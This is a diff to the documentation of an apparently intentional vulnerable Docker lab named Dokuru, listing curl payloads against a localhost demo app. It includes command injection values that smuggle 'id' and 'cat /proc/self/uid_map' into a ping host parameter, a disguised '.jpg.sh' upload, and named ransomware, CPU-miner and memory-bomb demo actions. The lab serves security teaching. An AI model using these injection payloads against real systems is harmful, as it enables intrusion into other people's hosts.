@@ -114,33 +114,31 @@ DOKURU_LAB_BASELINE_GHCR_TOKEN
 
 ## API Payloads
 
+Repeatable demo setup:
+
+```bash
+curl -X POST http://localhost:8080/api/demo/seed
+curl -X POST http://localhost:8080/api/demo/reset
+```
+
+Command injection RCE:
+
+```bash
+curl 'http://localhost:8080/api/ping?host=127.0.0.1;id;cat%20/proc/self/uid_map'
+```
+
 File upload userns gap:
 
 ```bash
+printf 'ownership proof\n' > /tmp/ownership-proof.txt
 curl -X POST http://localhost:8080/api/upload \
-  -F 'file=@./payloads/vacation_photo.jpg.sh'
+  -F 'file=@/tmp/ownership-proof.txt'
 ```
 
-Command injection:
+App data dump:
 
 ```bash
-curl 'http://localhost:8080/api/ping?host=127.0.0.1;id'
-```
-
-User namespace evidence:
-
-```bash
-curl -X POST http://localhost:8080/api/exec \
-  -H 'content-type: application/json' \
-  -d '{"command":"id; cat /proc/self/uid_map; cat /proc/self/gid_map"}'
-```
-
-PID namespace evidence:
-
-```bash
-curl -X POST http://localhost:8080/api/exec \
-  -H 'content-type: application/json' \
-  -d '{"command":"ps -eo pid,ppid,user,comm | head -40"}'
+curl -X POST http://localhost:8080/api/demo/dump
 ```
 
 PIDs cgroup pressure:
@@ -180,15 +178,15 @@ Controlled ransomware/reset demo:
 
 ```bash
 curl -X POST http://localhost:8080/api/exploit/ransomware
-curl -X POST http://localhost:8080/api/exploit/reset
+curl -X POST http://localhost:8080/api/demo/reset
 ```
 
 Blast-radius terminal actions are available from the browser UI over `/ws/terminal`:
 
 - `cpu-blast`: spawn 4 short-lived CPU miners and watch Customer Live View latency.
 - `memory-bomb` with `mb=3072`: push host memory pressure before rule 5.11 is fixed.
-- `steal-secrets`: legacy misconfiguration reference; baseline post-pwn proof should run through the host cron payload.
-- `sabotage-proxy`: legacy misconfiguration reference; baseline MVP skips it because PID namespace isolation works by default.
+
+The main browser flow intentionally avoids host-shell claims. The command injection endpoint represents a CVE-backed vulnerability class; the Docker baseline evidence is the UID map, host-root bind-mounted file ownership, app data compromise, and unconstrained cgroup pressure.
 
 ## Dokuru Validation Flow
 
